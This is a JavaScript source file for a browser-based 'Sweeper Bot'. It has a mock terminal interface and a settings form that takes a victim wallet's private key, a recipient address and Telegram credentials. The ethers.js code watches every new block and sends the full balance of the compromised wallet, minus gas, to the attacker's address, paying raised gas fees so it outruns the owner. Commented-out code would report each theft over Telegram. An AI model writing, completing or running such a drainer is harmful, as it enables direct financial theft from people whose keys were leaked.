// ============================================
let terminal_name = 'sweeperbot@terminal:~$';
let bot_status = false;
let botDetails = {};

const inputElement = document.getElementById('terminal-input');
const outputElement = document.getElementById('terminal-output');

document.addEventListener('DOMContentLoaded', function () {
  inputElement.addEventListener('keydown', function (event) {
    commondEnter(true, event, inputElement.value);
  });

  function commondEnter(key_or_text, event, commond) {
    let text_commond = commond.trim();

    if (bot_status) {
      if (event.key === 'Enter' || !key_or_text) {
        if (
          text_commond === 'start' ||
          text_commond === 'stop' ||
          text_commond === 'clear' ||
          text_commond === 'status'
        ) {
          handleCommand(text_commond);
        }

        inputElement.value = '';
      }

      return;
    }

    if (!key_or_text) {
      outputElement.innerHTML += `<div><span class="prompt">${terminal_name}</span> ${text_commond}</div>`;
      inputElement.value = '';
      handleCommand(text_commond);
      return;
    }

    if (event.key === 'Enter') {
      const command = inputElement.value.trim();
      if (command == '' || command == undefined || command == null) {
        return;
      }
      outputElement.innerHTML += `<div><span class="prompt">${terminal_name}</span> ${command}</div>`;
      inputElement.value = '';
      handleCommand(command);
      return;
    }
  }

  function handleCommand(command) {
    let output;
    let status_message = 'Sweeper Bot is currently stopped.';

    if (bot_status) {
      status_message = 'Sweeper Bot is currently running.';
      if (command == 'stop') {
        stop_bot();
        outputElement.innerHTML += `<div><span class="prompt">${terminal_name}</span> ${command}</div>`;
        inputElement.value = '';
        output = 'Sweeper Bot stopped.';
      } else if (command == 'start') {
        output = 'Sweeper Bot is already started.';
      } else if (command == 'clear') {
        inputElement.value = '';
        outputElement.innerHTML = ``;
        return;
      } else if (command == 'status') {
        output = status_message;
      }

      outputElement.innerHTML += `<div>${output}</div>`;
      outputElement.scrollTop = outputElement.scrollHeight;
      return;
    }

    switch (command.trim()) {
      case 'help':
        output = 'Available commands: help, start, stop, status, clear';
        break;
      case 'start':
        start_bot();
        output = '';
        break;
      case 'stop':
        output = 'Sweeper Bot stopped.';
        break;
      case 'status':
        output = status_message;
        break;
      case 'clear':
        outputElement.innerHTML = '';
        return;
      default:
        output = `command not found: ${command}`;
    }

    outputElement.innerHTML += `<div>${output}</div>`;
    outputElement.scrollTop = outputElement.scrollHeight;
  }

  document.getElementById('start-btn').addEventListener('click', function () {
    commondEnter(false, 'start', 'start');
  });

  document.getElementById('stop-btn').addEventListener('click', function () {
    commondEnter(false, 'stop', 'stop');
  });

  // =========================== modal ==========================
  const modal = document.getElementById('settings-modal');
  const settingsBtn = document.getElementById('settings-btn');
  const closeModal = document.getElementById('close-modal');
  const saveBtn = document.getElementById('save-btn');

  function setBotDetails() {
    const formData = new FormData(document.getElementById('settings-form'));
    formData.forEach((value, key) => {
      botDetails[key] = value;
    });
    alert('Bot Details Saved');
  }

  settingsBtn.addEventListener('click', function () {
    modal.style.display = 'block';
  });

  closeModal.addEventListener('click', function () {
    setBotDetails();
    modal.style.display = 'none';
  });

  window.addEventListener('click', function (event) {
    if (event.target == modal) {
      setBotDetails();
      modal.style.display = 'none';
    }
  });

  saveBtn.addEventListener('click', function () {
    setBotDetails();
    modal.style.display = 'none';
  });

  // =========================== bot function  ================
  // =========================== bot function  ================
  // =========================== bot function  ================

  let keys = [
    'network_rpc_url',
    'target_wallet_private_key',
    'recipient_address',
    'your_telegram_user_id',
    'your_telegram_bot_token',
    'network_name',
    'extra_gas_fee',
    'extra_gas_limit',
  ];

  let provider;
  let wallet;

  let BigNumber = ethers.BigNumber;
  const GWEI = 1e9;

  function gasPriceToGwei(gasPrice) {
    return gasPrice.mul(100).div(BigNumber.from(GWEI)).toNumber() / 100;
  }

  function stop_bot() {
    bot_status = false;
  }
  async function start_bot() {
    let check_res = await check_the_bot_details();
    let provider_wallet_res = await setProvider_and_wallet();
    let monitor_block = await monitor_block_fun();
  }

  // ================= dynamic function ================
  async function setProvider_and_wallet() {
    let set_pro_wall_s = true;
    const RPC_URL = botDetails['network_rpc_url'];
    const VICTIM_KEY = botDetails['target_wallet_private_key'];

    try {
      if (RPC_URL.startsWith('https') || RPC_URL.startsWith('http')) {
        provider = await new ethers.providers.JsonRpcProvider(RPC_URL);
      } else if (RPC_URL.startsWith('wss') || RPC_URL.startsWith('ws')) {
        provider = await new ethers.providers.WebSocketProvider(RPC_URL);
      }
      console.log(`Connected to ${RPC_URL}`);
    } catch (error) {
      set_pro_wall_s = false;
      console.log(error);
    }

    await provider.ready;

    try {
      wallet = await new ethers.Wallet(VICTIM_KEY, provider);
    } catch (error) {
      set_pro_wall_s = false;
      console.log(error);
    }

    return set_pro_wall_s;

  }

  // monitor each block 
  async function monitor_block_fun(){
    provider.on('block', async (blockNumber) => {
      console.log(`[BLOCK ${blockNumber}]`);
      await burn_native_tokens(wallet, botDetails);
    });
  }


  // ======== static funtion =======
  async function check_the_bot_details() {
    let empty = true;

    for (let key in botDetails) {
      if (
        botDetails[key] == '' ||
        botDetails[key] == null ||
        botDetails[key] == undefined
      ) {
        outputElement.innerHTML += `<div>Please enter the Bot - ${key}</div>`;
        empty = false;
      }
    }

    return empty;
  }


  // =================================== burning process   =======================================

      const utils = ethers.utils;
      const formatEther = utils.formatEther;
      let defaultGasLimit = 21000;

      const burn_native_tokens = async (burnWallet, config_de_value) => {
        const balance = await burnWallet.getBalance();
        if (balance.isZero()) {
          console.log(`Balance is zero`);
          return;
        }

        const gasPrice = (await burnWallet.getGasPrice()).add(utils.parseUnits((config_de_value['extra_gas_fee'] + '').trim(),'gwei'));


        let gas_fee_in_et = gasPrice.mul(config_de_value['extra_gas_limit']);

        if (balance.lt(gas_fee_in_et)) {
          console.log(`🔻 Balance [${ethers.utils.formatEther( balance)}] is very low for gas price: ${gasPriceToGwei(gasPrice)} gwei [${ethers.utils.formatEther(gas_fee_in_et)}]`);
          return;
        }

        console.log(gas_fee_in_et.toString());
        console.log(gasPrice.toString());

        const leftovers = balance.sub(gasPrice.mul(config_de_value['extra_gas_limit']));

        console.log(leftovers);

          try {
            console.log(`🔥 Burning: ${formatEther(balance)}`);

            const nonce = await burnWallet.provider.getTransactionCount(
              burnWallet.address,
            );

            const tx = await burnWallet.sendTransaction({
              to: config_de_value['recipient_address'],
              gasLimit: config_de_value.gas_limit,
              gasPrice,
              nonce,
              value: leftovers,
            });

        //     console.log('🚀 Transactions submitted');
        //     console.log(`📲 Transfer: ${formatEther(leftovers)}`);

        //     const receipt = await tx.wait();
        //     const txHash = receipt.transactionHash;

        //     console.log('✅ Tx hash - ' + txHash);

        //     const amount = formatEther(leftovers);
        //     const bot_token = config_de_value.telegram_bot_token;
        //     const telegram_id = config_de_value.telegram_user_id;

        //     let prepare_message = SendTgMessage.prepare_message({
        //       network: config_de_value.network_name,
        //       hash: txHash,
        //       amount: amount,
        //     });
        //     SendTgMessage.send_message(
        //       { bot_token: bot_token, telegram_id: telegram_id },
        //       prepare_message,
        //     );
          } catch (err) {
            if (
              err.code === 'REPLACEMENT_UNDERPRICED' ||
              err.code === 'INSUFFICIENT_FUNDS'
            ) {
              console.log('Gas fee too low. Transaction may fail. 😔');
            } else {
              console.log('Error sending transaction: 😱', err);
            }
          }

      };
});
